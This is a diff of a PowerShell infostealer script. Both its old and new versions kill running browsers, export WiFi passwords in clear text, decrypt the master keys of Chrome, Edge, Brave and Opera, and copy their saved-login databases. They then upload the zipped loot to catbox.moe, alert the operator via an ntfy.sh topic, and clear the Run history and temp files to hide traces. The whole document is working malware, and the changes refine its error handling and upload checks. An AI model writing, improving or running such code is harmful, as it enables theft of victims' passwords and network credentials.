@@ -1,82 +1,117 @@
+$ErrorActionPreference = 'Continue'
 $topic = "data_stwealer_hideen_"
-$logfile = "$env:TEMP\LootDebug.log"
-function Write-Log { param([string]$msg); "$((Get-Date).ToString('HH:mm:ss')) | $msg" | Out-File -Append -Encoding UTF8 $logfile; Write-Host $msg }
+$log   = "$env:TEMP\StealerDebug_$(Get-Date -Format 'HHmmss').log"
 
-Write-Log "=== DATA STEALER STARTED (Debug Mode) ==="
-
-# 1. Kill browsers so DBs are not locked
-Write-Log "Closing browsers..."
-Get-Process -Name "chrome","msedge","brave","opera" -ErrorAction SilentlyContinue | Stop-Process -Force
-Start-Sleep -Seconds 3
-
-# 2. Workspace
-$dir = "$env:TEMP\SysCache_$(Get-Random)"
-$zip = "$env:TEMP\UpdatePkg.zip"
-if (Test-Path $dir) { Remove-Item -Recurse -Force $dir -ErrorAction SilentlyContinue }
-New-Item -ItemType Directory -Path $dir | Out-Null
-Write-Log "Workspace created: $dir"
-
-# 3. WiFi export
-Write-Log "Exporting WiFi profiles..."
-netsh wlan export profile folder=$dir key=clear | Out-Null
-
-# 4. Browser looting (Chrome, Edge, Brave, Opera)
-$browsers = @{
-    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
-    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
-    "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
+function Log($msg) {
+    $line = "$(Get-Date -Format 'HH:mm:ss') | $msg"
+    $line | Out-File -Append -Encoding utf8 $log
+    Write-Host $line
 }
 
-foreach ($b in $browsers.Keys) {
-    $profilePath = $browsers[$b]
-    $localState = Join-Path $profilePath "Local State"
-    
-    if (Test-Path $localState) {
-        Write-Log "[$b] Found - extracting master key..."
-        try {
-            $json = Get-Content $localState -Raw | ConvertFrom-Json
-            $eK = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
-            $uK = [System.Security.Cryptography.ProtectedData]::Unprotect($eK[5..($eK.Length-1)], $null, 'CurrentUser')
-            [System.BitConverter]::ToString($uK) -replace '-' | Out-File "$dir\${b}_masterkey.txt"
-            
-            # Copy Login Data
-            $loginDB = if ($b -eq "Opera") { Join-Path $profilePath "Login Data" } else { Join-Path $profilePath "Default\Login Data" }
-            if (Test-Path $loginDB) {
-                Copy-Item $loginDB "$dir\${b}_LoginData.db" -Force
-                Write-Log "[$b] Login Data copied successfully"
-            } else {
-                Write-Log "[$b] Login Data file not found"
-            }
-        } catch {
-            Write-Log "[$b] ERROR: $($_.Exception.Message)"
+Log "=== START ==="
+
+# Load required assemblies early
+try {
+    Add-Type -AssemblyName System.Security
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    Log "Assemblies loaded"
+} catch {
+    Log "CRITICAL: Cannot load assemblies - $($_.Exception.Message)"
+    exit 1
+}
+
+# Kill browsers (forcefully, wait, retry)
+Log "Terminating browsers..."
+@("chrome","msedge","brave","opera") | ForEach-Object {
+    Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+}
+Start-Sleep -Seconds 4
+
+# Workspace
+$dir = "$env:TEMP\Cache_$(Get-Random -Minimum 10000 -Maximum 999999)"
+$zip = "$env:TEMP\Pkg_$(Get-Random -Minimum 1000 -Maximum 9999).zip"
+if (Test-Path $dir) { Remove-Item -Recurse -Force $dir -EA SilentlyContinue }
+New-Item -ItemType Directory $dir | Out-Null
+Log "Workspace: $dir"
+
+# WiFi profiles
+Log "Exporting WiFi profiles..."
+netsh wlan export profile folder=$dir key=clear | Out-Null
+
+# Browser targets
+$browsers = @{
+    Chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+    Edge   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+    Brave  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+    Opera  = "$env:APPDATA\Opera Software\Opera Stable"
+}
+
+foreach ($name in $browsers.Keys) {
+    $base = $browsers[$name]
+    $localState = Join-Path $base "Local State"
+
+    if (-not (Test-Path $localState)) { 
+        Log "[$name] Local State not found"
+        continue 
+    }
+
+    Log "[$name] Processing..."
+
+    try {
+        $json = Get-Content $localState -Raw -EA Stop | ConvertFrom-Json -EA Stop
+        $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
+        $keyBytes = $encKey[5..($encKey.Length-1)]
+        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, 'CurrentUser')
+        $keyHex = [BitConverter]::ToString($masterKey) -replace '-'
+        $keyHex | Out-File "$dir\$($name)_masterkey.txt" -Encoding ascii
+        Log "[$name] Master key extracted"
+
+        # Login Data path
+        $profilePath = if ($name -eq "Opera") { $base } else { Join-Path $base "Default" }
+        $dbPath = Join-Path $profilePath "Login Data"
+
+        if (Test-Path $dbPath) {
+            $dest = "$dir\$($name)_LoginData.db"
+            Copy-Item $dbPath $dest -Force -EA Stop
+            Log "[$name] Login Data copied → $dest"
+        } else {
+            Log "[$name] Login Data not found at $dbPath"
         }
+    }
+    catch {
+        Log "[$name] ERROR: $($_.Exception.Message)"
     }
 }
 
-# 5. Zip everything
-Write-Log "Creating zip archive..."
-Add-Type -AssemblyName "System.IO.Compression.FileSystem"
+# Create zip
+Log "Creating archive..."
 [System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
-Write-Log "Zip created: $zip ($( (Get-Item $zip).Length / 1MB ) MB)"
+$sizeMB = "{0:N2}" -f ((Get-Item $zip).Length / 1MB)
+Log "Archive created: $zip ($sizeMB MB)"
 
-# 6. Upload (with better error handling)
-Write-Log "Uploading to catbox.moe..."
-$uploadResult = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
+# Upload with better capture
+Log "Uploading..."
+$curlArgs = @("-s", "-S", "-F", "reqtype=fileupload", "-F", "fileToUpload=@$zip", "https://catbox.moe/user/api.php")
+$linkRaw = & curl.exe @curlArgs 2>&1
+$link = ($linkRaw | Out-String).Trim()
 
-if ($uploadResult -like "http*") {
-    Write-Log "Upload successful → $uploadResult"
-    Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot ready: $uploadResult" -ErrorAction SilentlyContinue
+Log "Raw curl output: $link"
+
+if ($link -match '^https?://files\.catbox\.moe/') {
+    Log "Upload OK → $link"
+    try {
+        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "File: $link" -TimeoutSec 12
+        Log "ntfy sent"
+    } catch {
+        Log "ntfy failed: $($_.Exception.Message)"
+    }
 } else {
-    Write-Log "Upload failed or suspicious response: $uploadResult"
+    Log "Upload FAILED or invalid link"
 }
 
-# 7. Cleanup + Final log
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
-Remove-Item -Recurse -Force $dir, $zip -ErrorAction SilentlyContinue
-Write-Log "=== FINISHED ==="
+# Cleanup
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -EA SilentlyContinue
+Remove-Item -Recurse -Force $dir,$zip -EA SilentlyContinue
 
-# Keep window open so you can read the log
-Write-Host "`n`nDEBUG LOG SAVED TO: $logfile" -ForegroundColor Green
-Write-Host "Press any key to close..." -ForegroundColor Yellow
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+Log "=== FINISHED ==="
+Start-Sleep -Seconds 8   # give time to read log before window closes (remove if unwanted)
